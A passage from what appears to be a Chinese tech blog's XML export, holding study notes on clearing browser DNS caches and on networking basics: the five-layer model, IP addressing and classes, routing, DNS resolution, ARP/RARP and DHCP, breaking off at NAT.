当然也可以按照需要设置成其它的值。但是dns缓存太久了也会出问题，比如有的网站ip换了，就无法访问了。针对这样的问题，还可以安装一个 firefox 插件来开启或者 关闭dns cache功能</p><h1 id="清除-x2F-刷新浏览器-DNS-缓存"><a href="#清除-x2F-刷新浏览器-DNS-缓存" class="headerlink" title="清除&#x2F;刷新浏览器 DNS 缓存"></a>清除&#x2F;刷新浏览器 DNS 缓存</h1><p>大多数现代的 Web 浏览器都有一个内置的 DNS 客户端，以防止每次访问该网站时重复查询。</p><h2 id="谷歌浏览器-Chrome"><a href="#谷歌浏览器-Chrome" class="headerlink" title="谷歌浏览器 Chrome"></a>谷歌浏览器 Chrome</h2><p>要清除 Google Chrome 的 DNS 缓存，请执行以下步骤：</p><ol><li>打开一个新标签，然后在地址栏输入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome://net-internals/#dnsChrome</span><br></pre></td></tr></table></figure><ol start="2"><li>点击 “清除主机缓存” 按钮。</li></ol><p>如果那对你不起作用，请尝试清除缓存和 Cookie。</p><ul><li>按下 CTRL+Shift+Del 以打开 “清除浏览数据” 对话框窗口。</li><li>选择一个时间范围。选择 “所有时间” 以删除所有内容。</li><li>选中 “Cookie 和其他站点数据” 和 “缓存的图像和文件” 框。</li><li>点击 “清除数据” 按钮。</li></ul><p>此方法适用于所有基于 Chrome 的浏览器，包括 Chromium，Vivaldi 和 Opera。</p><h2 id="火狐-Firefox"><a href="#火狐-Firefox" class="headerlink" title="火狐 Firefox"></a>火狐 Firefox</h2><p>要清除 Firefox 的 DNS 缓存，请执行以下步骤：</p><ol><li>在右上角，单击汉堡包图标 ☰ 以打开 Firefox 的菜单：</li><li>点击 ⚙ Options (Preferences) 链接。</li><li>单击左侧的 “隐私和安全性” 或 “隐私” 选项卡。</li><li>向下滚动到该 History 部分，然后单击 Clear History… 按钮。</li><li>选择要清除的时间范围。选择 “所有内容” 以删除所有内容。</li><li>选择所有框，然后单击 “立即清除” 。</li></ol><p>如果这对你不起作用，请尝试以下方法并暂时禁用 DNS 缓存。</p><ol><li>打开一个新标签，然后在 Firefox 的地址栏中输入 about:config 。</li><li>搜索 network.dnsCacheExpiration，将值暂时设置为 0，然后单击 “确定”。然后，改回默认值，然后单击 “确定” 。</li><li>搜索 network.dnsCacheEntries，将值暂时设置为 0，然后单击 “确定” 。然后，改回默认值，然后单击 “确定”。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
          <category> DNS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x04 - 网络协议基础</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/0x04%20-%20%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/0x04%20-%20%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>计算机网络基础知识</p><h1 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h1><blockquote><p><a href="https://mp.weixin.qq.com/s/lroONaj5dVM0z7MD7DPE_A">「网络协议分层」</a></p></blockquote><p>对于<strong>同一台设备</strong>上的进程间通信，有很多种方式，比如有<strong>管道、消息队列、共享内存、信号</strong>等方式，</p><p>而对于<strong>不同设备</strong>上的进程间通信，就需要网络通信，而设备是多样性的，所以要兼容多种多样的设备，就协商出了<strong>一套通用的网络协议</strong>。这个网络协议是分层的，每一层都有各自的作用和职责，通常是由上到下，分成 5层。接下来就分别对每一层进行介绍。</p><ul><li>应用层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>最上层的，也是我们能直接接触到的就是应用层（ Application Layer ），我们电脑或手机使用的应用软件都是在应用层实现。那么，当两个不同设备的应用需要通信的时候，应用就把应用数据传给下一层，也就是传输层。所以，应用层只需要专注于为用户提供应用功能，不用去关心数据是如何传输的，就类似于，我们寄快递的时候，只需要把包裹交给快递员，由他负责运输快递，我们不需要关心快速是如何被运输的。</p><p>而且<strong>应用层是工作在操作系统中的用户态，传输层及以下则工作在内核态</strong>。</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>应用层的数据包会传给传输层，传输层（Transport Layer）是为应用层提供网络支持的。</p><p>在传输层会有两个传输协议，分别是 TCP 和 UDP。</p><ul><li>TCP 的全称叫传输层控制协议（Transmission Control Protocol），大部分应用使用的正是 TCP 传输层协议，比如 HTTP 应用层协议。TCP 相比 UDP 多了很多特性，比如<strong>流量控制、超时重传、拥塞控制</strong>等，这些都是为了保证数据包能可靠地传输给对方。</li><li>UDP 就相对很简单，简单到只负责发送数据包，不保证数据包是否能抵达对方，但它实时性相对更好，传输效率也高。当然，UDP 也可以实现可靠传输，把 TCP 的特性在应用层上实现就可以，不过要实现一个商用的可靠 UDP 传输协议，也不是一件简单的事情。</li></ul><p>应用需要传输的数据可能会非常大，如果直接传输就不好控制，因此当传输层的数据包大小超过 MSS（TCP 最大报文段长度） ，就要将数据包分块，这样即使中途有一个分块丢失或损坏了，只需要重新这一个分块，而不用重新发送整个数据包。在 TCP协议中，我们把每个分块称为一个 TCP 段（TCP Segment）。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302014980.png" alt="image-20220930201436565" style="zoom:50%;" /><p>当设备作为接收方时，传输层则要负责把数据包传给应用，但是一台设备上可能会有很多应用在接收或者传输数据，因此需要用一个编号将应用区分开来，这个编号就是端口。比如 80 端口通常是 Web 服务器用的，22 端口通常是远程登录服务器用的。而对于浏览器（客户端）中的每个标签栏都是一个独立的进程，操作系统会为这些进程分配临时的端口号。由于传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>传输层可能大家刚接触的时候，会认为它负责将数据从一个设备传输到另一个设备，事实上它并不负责。实际场景中的网络环节是错综复杂的，中间有各种各样的线路和分叉路口，如果一个设备的数据要传输给另一个设备，就需要在各种各样的路径和节点进行选择，而传输层的设计理念是简单、高效、专注，如果传输层还负责这一块功能就有点违背设计原则了。</p><p>也就是说，我们不希望传输层协议处理太多的事情，只需要服务好应用即可，让其作为应用间数据传输的媒介，帮助实现应用到应用的通信，而实际的传输功能就交给下一层，也就是网络层（Internet Layer）。</p><p>网络层最常使用的是 IP 协议（Internet Protocol），IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302016036.png" alt="image-20220930201610710" style="zoom:50%;" /><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，又该如何找到对方呢？因此，网络层需要有区分设备的编号。</p><p>我们一般用 IP 地址给设备进行编号，对于 IPv4 协议， IP 地址共 32 位，分成了四段，每段是 8 位。只有一个单纯的 IP 地址虽然做到了区分设备，但是寻址起来就特别麻烦，全世界那么多台设备，难道一个一个去匹配？这显然不科学。因此，需要将 IP 地址分成两种意义：</p><ul><li>一个是网络号，负责标识该 IP 地址是属于哪个子网的；</li><li>一个是主机号，负责标识同一子网下的不同主机；</li></ul><p>怎么分的呢？这需要配合子网掩码才能算出 IP 地址 的网络号和主机号。那么在寻址的过程中，先匹配到相同的网络号，才会去找对应的主机。</p><p><strong>除了寻址能力， IP 协议还有另一个重要的能力就是路由。</strong></p><p>实际场景中，两台设备并不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多网络设备连接起来的，那么就会形成很多条网络的路径，因此当数据包到达一个网络节点，就需要通过算法决定下一步走哪条路径。所以，IP 协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是根据「下一个目的地」选择路径。</p><p><strong>寻址</strong>更像在导航，<strong>路由</strong>更像在操作方向盘。</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>实际场景中，网络并不是一个整体，比如你家和我家就不属于一个网络，所以数据不仅可以在同一个网络中设备间进行传输，也可以跨网络进行传输。一旦数据需要跨网络传输，就需要有一个设备同时在两个网络当中，这个设备一般是路由器，路由器可以通过路由表计算出下一个要去的 IP 地址。那问题来了，路由器怎么知道这个 IP 地址是哪个设备的呢？于是，就需要有一个专门的层来标识网络中的设备，让数据在一个链路中传输，这就是数据链路层（Data Link Layer），它主要为网络层提供链路级别传输的服务。</p><p>每一台设备的网卡都会有一个 MAC 地址，它就是用来唯一标识设备的。路由器计算出了下一个目的地 IP 地址，再通过 ARP 协议找到该目的地的 MAC 地址，这样就知道这个 IP 地址是哪个设备的了。</p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>当数据准备要从设备发送到网络时，需要把数据包转换成电信号，让其可以在物理介质中传输，这一层就是物理层（Physical Layer），它主要是为数据链路层提供二进制传输的服务。</p><h1 id="图解IP"><a href="#图解IP" class="headerlink" title="图解IP"></a>图解IP</h1><blockquote><p><a href="https://mp.weixin.qq.com/s/qydIO7NDfFTYs4-ZZlfgRg">IP 基础知识“全家桶”，45 张图一套带走</a></p></blockquote><h2 id="IP基本认识"><a href="#IP基本认识" class="headerlink" title="IP基本认识"></a>IP基本认识</h2><h3 id="IP的作用："><a href="#IP的作用：" class="headerlink" title="IP的作用："></a>IP的作用：</h3><p>网络层的主要作用是：实现主机与主机之间的通信，也叫点对点（end to end）通信。</p><h3 id="IP与MAC的关系"><a href="#IP与MAC的关系" class="headerlink" title="IP与MAC的关系:"></a>IP与MAC的关系:</h3><p>IP（网络层） 和 MAC （数据链路层）之间的区别和关系在上面我们知道 IP 的作用是主机之间通信的，而 MAC 的作用则是实现「直连」的两个设备之间通信，而 IP 则负责在「没有直连」的两个网络之间进行通信传输。</p><p>举个生活的栗子，小林要去一个很远的地方旅行，制定了一个行程表，其间需先后乘坐飞机、地铁、公交车才能抵达目的地，为此小林需要买飞机票，地铁票等。飞机票和地铁票都是去往特定的地点的，每张票只能够在某一限定区间内移动，此处的「区间内」就如同通信网络中数据链路。在区间内移动相当于数据链路层，充当区间内两个节点传输的功能，区间内的出发点好比源 MAC 地址，目标地点好比目的 MAC 地址。整个旅游行程表就相当于网络层，充当远程定位的功能，行程的开始好比源 IP，行程的终点好比目的 IP 地址。</p><p>如果小林只有行程表而没有车票，就无法搭乘交通工具到达目的地。相反，如果除了车票而没有行程表，恐怕也很难到达目的地。因为小林不知道该坐什么车，也不知道该在哪里换乘。因此，只有两者兼备，既有某个区间的车票又有整个旅行的行程表，才能保证到达目的地。与此类似，计算机网络中也需要「数据链路层」和「网络层」这个分层才能实现向最终目标地址的通信。还有重要一点，旅行途中我们虽然不断变化了交通工具，但是旅行行程的起始地址和目的地址始终都没变。其实，在网络中数据包传输中也是如此，源IP地址和目标IP地址在传输过程中是不会变化的，只有源 MAC 地址和目标 MAC 一直在变化。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302022945.png" alt="image-20220930202241592" style="zoom:50%;" /><h2 id="IP地址的基础知识"><a href="#IP地址的基础知识" class="headerlink" title="IP地址的基础知识"></a>IP地址的基础知识</h2><h3 id="IP地址的定义"><a href="#IP地址的定义" class="headerlink" title="IP地址的定义"></a>IP地址的定义</h3><p>在 TCP&#x2F;IP 网络通信时，为了保证能正常通信，每个设备都需要配置正确的 IP 地址，否则无法实现正常的通信。IP 地址（IPv4 地址）由 32 位正整数来表示，IP 地址在计算机是以二进制的方式处理的。</p><p>而人类为了方便记忆采用了点分十进制的标记方式，也就是将 32 位 IP 地址以每 8位为组，共分为 4 组，每组以<code>.</code>隔开，再将每组转换成十进制。</p><p>实际上，<strong>IP 地址并不是根据主机台数来配置的</strong>，而是以网卡。像服务器、路由器等设备都是有 2 个以上的网卡，也就是它们会有 2 个以上的 IP 地址。</p><h3 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h3><p>互联网诞生之初，IP 地址显得很充裕，于是计算机科学家们设计了分类地址。IP 地址分类成了 5 种类型，分别是 A 类、B 类、C 类、D 类、E 类。</p><ul><li>上图中黄色部是分类号，用以区分 IP 地址类别。</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302024716.png" alt="image-20220930202424434" style="zoom:50%;" /><ul><li>其中对于 A、B、C 类主要分为两个部分，分别是网络号和主机号。这很好理解，好比小林是 A 小区 1 栋 101 号，你是 B 小区 1 栋 101 号。我们可以用下面这个表格， 就能很清楚的知道 A、B、C 分类对应的地址范围、最大主机个数。</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302026244.png" alt="image-20220930202607970" style="zoom:50%;" /><ul><li>A、B、C 分类地址最大主机个数是如何计算的呢？</li></ul><p>最大主机个数，就是要看主机号的位数，如 C 类地址的主机号占 8 位，那么 C 类地址的最大主机个数：<code>2^8- 2 = 254</code></p><p>为什么要减 2 呢？因为在 IP 地址中，有两个 IP 是特殊的，分别是主机号全为 1 和 全为 0 地址。因此，在分配过程中，应该去掉这两种情况。</p><blockquote><ul><li>主机号全为 1 指定某个网络下的所有主机，用于广播</li><li>主机号全为 0 指定某个网络</li></ul></blockquote><ul><li>广播地址用于什么？</li></ul><p>广播地址用于在同一个链路中相互连接的主机之间发送数据包。</p><p>当主机号全为 1 时，就表示该网络的广播地址。例如把 <code>172.20.0.0/16</code> 用二进制表示如下：</p><p><code>10101100.00010100.00000000.00000000</code></p><p>将这个地址的主机部分全部改为 1，则形成广播地址：</p><p><code>10101100.00010100.11111111.11111111</code></p><p>再将这个地址用十进制表示，则为 <code>172.20.255.255</code> 。</p><p>广播地址可以分为<strong>本地广播</strong>和<strong>直接广播</strong>两种。</p><p>在本网络内广播的叫做<strong>本地广播</strong>。例如网络地址为 192.168.0.0&#x2F;24 的情况下，广播地址是 192.168.0.255 。因为这个广播地址的 IP 包会被路由器屏蔽，所以不会到达 192.168.0.0&#x2F;24 以外的其他链路上。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302048652.png" alt="image-20220930204832366" style="zoom:50%;" /><p>在<strong>不同网络之间的广播叫做直接广播</strong>。例如网络地址为 192.168.0.0&#x2F;24 的主机向 192.168.1.255&#x2F;24 的目标地址发送 IP 包。收到这个包的路由器，将数据转发给192.168.1.0&#x2F;24，从而使得所有192.168.1.1~192.168.1.254 的主机都能收到这个包（<strong>由于直接广播有一定的安全问题，多数情况下会在路由器上设置为不转发</strong>）。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302054937.png" alt="image-20220930205430651" style="zoom:50%;" /><ul><li>什么是 D、E 类地址？</li></ul><p>而 D 类和 E 类地址是没有主机号的，所以不可用于主机 IP，D 类常被用于多播，E类是预留的分类，暂时未使用</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302054629.png" alt="image-20220930205451353" style="zoom:50%;" /><ul><li>IP 分类的优点</li></ul><p>不管是路由器还是主机解析到一个 IP 地址时候，我们判断其 IP 地址的首位是否为0，为 0 则为 A 类地址，那么就能很快的找出网络地址和主机地址。</p><p>其余分类判断方式参考如下图：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302057124.png" alt="image-20220930205727877" style="zoom:50%;" /><h3 id="公有IP与私有IP地址"><a href="#公有IP与私有IP地址" class="headerlink" title="公有IP与私有IP地址"></a>公有IP与私有IP地址</h3><p>在 A、B、C 分类地址，实际上有分公有 IP 地址和 私有 IP 地址。下图为常见三类内网地址</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302059456.png" alt="image-20220930205906149" style="zoom:50%;" /><h3 id="IP-地址与路由控制"><a href="#IP-地址与路由控制" class="headerlink" title="IP 地址与路由控制"></a>IP 地址与路由控制</h3><p>IP地址的网络地址这一部分是用于进行路由控制。路由控制表中记录着网络地址与下一步应该发送至路由器的地址，在主机和路由器上都会有各自的路由器控制表。在发送 IP 包时，首先要确定 IP 包首部中的目标地址，再从路由控制表中找到与该地址具有相同网络地址的记录，根据该记录将 IP 包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录，就选择相同位数最多的网络地址，也就是最长匹配。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302100814.png" alt="image-20220930210006507" style="zoom:50%;" /><ul><li>主机 A 要发送一个 IP 包，其源地址是 10.1.1.30 和目标地址是 10.1.2.10 ，由于没有在主机 A 的路由表找到与目标地址 10.1.2.10 的网络地址，于是把包被转发到默认路由（路由器 1 ）</li></ul><p><strong>注意：</strong></p><blockquote><p>在主机A的路由表中，有一条0.0.0.0&#x2F;0表示，如果在此表中找不到匹配项，就将所有的ip转发的10.1.1.1默认网关（也就是路由器1）去查找</p><ul><li>路由器 1 收到 IP 包后，也在路由器 1 的路由表匹配与目标地址相同的网络地址记录，发现匹配到了，于是就把 IP 数据包转发到了 10.1.0.2 这台路由器 2</li><li>路由器 2 收到后，同样对比自身的路由表，发现匹配到了，于是把 IP 包从路由器 2 的 10.1.2.1 这个接口出去，最终经过交换机把 IP 数据包转发到了目标主机</li></ul></blockquote><h3 id="环回地址是不会流向网络"><a href="#环回地址是不会流向网络" class="headerlink" title="环回地址是不会流向网络"></a>环回地址是不会流向网络</h3><p>环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。计算机使用一个特殊的 IP 地址 127.0.0.1 作为环回地址，与该地址具有相同意义的是一个叫做 localhost 的主机名。使用这个 IP 或主机名时，数据包不会流向网络。</p><h1 id="IP-协议相关技术"><a href="#IP-协议相关技术" class="headerlink" title="IP 协议相关技术"></a>IP 协议相关技术</h1><p>跟 IP 协议相关的技术也不少，接下来说说与 IP 协议相关的重要且常见的技术。</p><ul><li>DNS 域名解析</li><li>ARP 与 RARP 协议</li><li>DHCP 动态获取 IP 地址</li><li>NAT 网络地址转换</li><li>ICMP 互联网控制报文协议</li></ul><h2 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS 域名解析"></a>DNS 域名解析</h2><p>我们在上网的时候，通常使用的方式域名，而不是 IP 地址，因为域名方便人类记忆。那么实现这一技术的就是 DNS 域名解析，DNS 可以将域名网址自动转换为具体的 IP地址。</p><p>对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h3 id="域名的层级关系"><a href="#域名的层级关系" class="headerlink" title="域名的层级关系"></a>域名的层级关系</h3><p>DNS 中的域名都是用句点来分隔的，比如 <a href="http://www.server.com/">www.server.com</a> ，这里的句点代表了不同层次之间的界限。在域名中，越靠右的位置表示其层级越高。</p><p>毕竟域名是外国人发明，所以思维和中国人相反，比如说一个城市地点的时候，外国喜欢从小到大的方式顺序说起（如 XX 街道 XX 区 XX 市 XX 省），而中国则喜欢从大到小的顺序（如 XX 省 XX 市 XX 区 XX 街道）。</p><p>根域是在最顶层，它的下一层就是 com 顶级域，再下面是 server.com。所以域名的层级关系类似一个树状结构：</p><ul><li>根 DNS 服务器</li><li>顶级域 DNS 服务器（com）</li><li>权威 DNS 服务器（server.com）</li></ul><p>根域的 DNS 服务器信息保存在互联网中所有的 DNS 服务器中。这样一来，任何DNS 服务器就都可以找到并访问根域 DNS 服务器了。</p><p>因此，客户端只要能够找到任意一台 DNS 服务器，就可以通过它找到根域 DNS 服务器，然后再一路顺藤摸瓜找到位于下层的某台目标 DNS 服务器。</p><h3 id="域名解析的工作流程"><a href="#域名解析的工作流程" class="headerlink" title="域名解析的工作流程"></a>域名解析的工作流程</h3><blockquote><ol><li>-<a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%B5%8F%E8%A7%88%E5%99%A8DNS%E7%BC%93%E5%AD%98.html" title="浏览器DNS缓存">浏览器DNS缓存</a></li><li>-<a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FDNS%E7%BC%93%E5%AD%98.html" title="操作系统DNS缓存">操作系统DNS缓存</a></li><li>-<a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%9C%AC%E6%9C%BA%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%96%87%E4%BB%B6-hosts.html" title="本机域名解析文件 hosts">本机域名解析文件 hosts</a></li><li>-路由器DNS缓存</li><li>-ISP DNS 缓存</li><li>-递归搜索</li></ol></blockquote><p>浏览器首先看一下自己的缓存里有没有，如果没有就向操作系统的缓存要，还没有就检查本机域名解析文件 hosts ，如果还是没有，就会 DNS 服务器进行查询，查询的过程如下：（迭代查询）</p><blockquote><ol><li><p>本地的DNS客户端首先会发出一个 DNS 请求，问 <a href="http://www.server.com/">www.server.com</a> 的 IP 是啥，并发给本地 DNS 服务器（也就是客户端的 TCP&#x2F;IP 设置中填写的 DNS 服务器地址）。</p></li><li><p>本地域名服务器收到客户端的请求后，如果缓存里的表格能找到www.server.com，则它直接返回 IP 地址。如果没有，本地 DNS 会去问它的根域名服务器：“老大， 能告诉我 <a href="http://www.server.com/">www.server.com</a> 的 IP 地址吗？” 根域名服务器是最高层次的，它不直接用于域名解析，但能指明一条道路。</p></li><li><p>根 DNS 收到来自本地 DNS 的请求后，发现后置是 .com，说：“<a href="http://www.server.com/">www.server.com</a> 这个域名归 .com 区域管理”，我给你 .com 顶级域名服务器地址给你，你去问问它吧。”</p></li><li><p>本地 DNS 收到顶级域名服务器的地址后，发起请求问“老二， 你能告诉我 <a href="http://www.server.com/">www.server.com</a> 的 IP 地址吗？”</p></li><li><p>顶级域名服务器说：“我给你负责 <a href="http://www.server.com/">www.server.com</a> 区域的权威 DNS 服务器的地址，你去问它应该能问到”。</p></li><li><p>本地 DNS 于是转向问权威 DNS 服务器：“老三，<a href="http://www.server.com对应的IP是啥呀？”">www.server.com对应的IP是啥呀？”</a> server.com 的权威 DNS 服务器，它是域名解析结果的原出处。为啥叫权威呢？就是我的域名我做主。</p></li><li><p>权威 DNS 服务器查询后将对应的 IP 地址 X.X.X.X 告诉本地 DNS。</p></li><li><p>本地 DNS 再将 IP 地址返回客户端，客户端和目标建立连接。</p></li></ol></blockquote><p>至此，我们完成了 DNS 的解析过程。现在总结一下，整个过程我画成了一个图。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302157697.png" alt="image-20220930215718319" style="zoom:50%;" /><h3 id="常见DNS服务器"><a href="#常见DNS服务器" class="headerlink" title="常见DNS服务器"></a><a href="https://11pmsleep.github.io/2022-09-22-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/">常见DNS服务器</a></h3><blockquote><p>见链接</p></blockquote><h2 id="ARP-与-RARP-协议"><a href="#ARP-与-RARP-协议" class="headerlink" title="ARP 与 RARP 协议"></a>ARP 与 RARP 协议</h2><p>在传输一个 IP 数据报的时候，确定了源 IP 地址和目标 IP 地址后，就会通过主机「路由表」确定 IP 数据包下一跳。然而，网络层的下一层是数据链路层，所以我们还要知道「下一跳」的 MAC 地址。</p><p>由于主机的路由表中可以找到下一条的 IP 地址，所以可以通过 ARP 协议，<strong>求得下一跳的 MAC 地址</strong>。</p><h3 id="那么-ARP-又是如何知道对方-MAC-地址的呢？"><a href="#那么-ARP-又是如何知道对方-MAC-地址的呢？" class="headerlink" title="那么 ARP 又是如何知道对方 MAC 地址的呢？"></a>那么 ARP 又是如何知道对方 MAC 地址的呢？</h3><p>简单地说，ARP 是借助 <strong>ARP 请求</strong>与 <strong>ARP 响应</strong>两种类型的包确定 MAC 地址的。</p><ul><li><p>主机会通过<strong>广播</strong>发送 <strong>ARP 请求</strong>，这个包中包含了想要知道的 <strong>MAC 地址的主机IP 地址</strong>。</p></li><li><p>当同个链路中的所有设备收到 ARP 请求时，会去拆开 ARP 请求包里的内容，<strong>如果 ARP 请求包中的目标 IP 地址与自己的 IP 地址一致</strong>，那么这个设备就将自己的MAC 地址塞入 ARP 响应包返回给主机。</p></li></ul><p>操作系统通常会把第一次通过 ARP 获取的 MAC 地址缓存起来，以便下次直接从缓存中找到对应 IP 地址的 MAC 地址。不过，MAC 地址的缓存是有一定期限的，超过这个期限，缓存的内容将被清除。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302159684.png" alt="image-20220930215958290" style="zoom:50%;" /><h3 id="RARP-协议你知道是什么吗？"><a href="#RARP-协议你知道是什么吗？" class="headerlink" title="RARP 协议你知道是什么吗？"></a>RARP 协议你知道是什么吗？</h3><p>ARP 协议是已知 IP 地址 求 MAC 地址，那 RARP 协议正好相反。</p><p>它是已知 MAC 地址求 IP 地址。例如将<strong>打印机服务器等小型嵌入式设备</strong>接入到网络时就经常会用得到。通常这需要架设一台 <strong>RARP 服务器</strong>，在这个服务器上<strong>注册设备的 MAC 地址及其 IP地址</strong>。然后再将这个设备接入到网络，接着：</p><ul><li>该设备会发送一条「我的 MAC 地址是XXXX，请告诉我，我的IP地址应该是什么」的请求信息。</li><li>RARP 服务器接到这个消息后返回「MAC地址为 XXXX 的设备，IP地址为 XXXX」的信息给这个设备。</li></ul><p>最后，设备就根据从 RARP 服务器所收到的应答信息设置自己的 IP 地址。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302201834.png" alt="image-20220930220133582" style="zoom:50%;" /><h2 id="DHCP-动态获取-IP-地址"><a href="#DHCP-动态获取-IP-地址" class="headerlink" title="DHCP 动态获取 IP 地址"></a>DHCP 动态获取 IP 地址</h2><p>DHCP 在生活中我们是很常见的了，我们的电脑通常都是通过 DHCP 动态获取 IP 地址，大大省去了配 IP 信息繁琐的过程。接下来，我们来看看我们的电脑是如何通过 4 个步骤的过程，获取到 IP 的。</p><h3 id="DHCP-工作流程"><a href="#DHCP-工作流程" class="headerlink" title="DHCP 工作流程"></a>DHCP 工作流程</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302211280.png" alt="image-20220930221145961" style="zoom:50%;" /><p>DHCP 交互的 4 个步骤：</p><blockquote><ul><li><p>客户端首先发起 DHCP 发现报文（DHCP DISCOVER） 的 IP 数据报，由于客户端没有 IP 地址，也不知道 DHCP 服务器的地址，所以使用的是 UDP 广播通信，其使用的广播目的地址是 255.255.255.255（端口 67） 并且使用 0.0.0.0（端口 68） 作为源 IP 地址。DHCP 客户端将该 IP 数据报传递给链路层，链路层然后将帧广播到所有的网络中设备。</p></li><li><p>DHCP 服务器收到 DHCP 发现报文时，用 DHCP 提供报文（DHCP OFFER） 向客户端做出响应。该报文仍然使用 IP 广播地址 255.255.255.255，该报文信息携带服务器提供可租约的 IP 地址、子网掩码、默认网关、DNS 服务器以及 IP 地址租用期。</p></li><li><p>客户端收到一个或多个服务器的 DHCP 提供报文后，从中选择一个服务器，并向选中的服务器发送 DHCP 请求报文（DHCP REQUEST进行响应，回显配置的参数。</p></li><li><p>最后，服务端用 DHCP ACK 报文对 DHCP 请求报文进行响应，应答所要求的参数。</p></li></ul></blockquote><p>一旦客户端收到 DHCP ACK 后，交互便完成了，并且客户端能够在租用期内使用DHCP 服务器分配的 IP 地址。</p><p>如果租约的 DHCP IP 地址快期后，客户端会向服务器发送 DHCP 请求报文：</p><blockquote><ul><li>服务器如果同意继续租用，则用 DHCP ACK 报文进行应答，客户端就会延长租期。</li><li>服务器如果不同意继续租用，则用 DHCP NACK 报文，客户端就要停止使用租约的 IP 地址。</li></ul></blockquote><p>可以发现，DHCP 交互中，全程都是使用 UDP 广播通信。</p><p><strong>咦，用的是广播，那如果 DHCP 服务器和客户端不是在同一个局域网内，路由器又不会转发广播包，那不是每个网络都要配一个 DHCP 服务器？</strong></p><p>所以，为了解决这一问题，就出现了 DHCP 中继代理。</p><p>有了 DHCP 中继代理以后，对不同网段的 IP 地址分配也可以由一个 DHCP 服务器统一进行管理。</p><blockquote><ul><li><p>DHCP 客户端会向 DHCP 中继代理发送 DHCP 请求包，而 DHCP 中继代理在收到这个广播包以后，再以单播的形式发给 DHCP 服务器。</p></li><li><p>服务器端收到该包以后再向 DHCP 中继代理返回应答，并由 DHCP 中继代理将此包转发给 DHCP 客户端</p></li></ul></blockquote><p>因此，DHCP 服务器即使不在同一个链路上也可以实现统一分配和管理IP地址。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302213176.png" alt="image-20220930221354860" style="zoom:50%;" /><h2 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT 网络地址转换"></a>NAT 网络地址转换</h2><p>私有 IP 地址转换成公有 IP 地址私有 IP 地址转换成公有 IP 地址</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302214001.png" alt="image-20220930221414766" style="zoom:50%;" /><p><strong>那不是 N 个 私有 IP 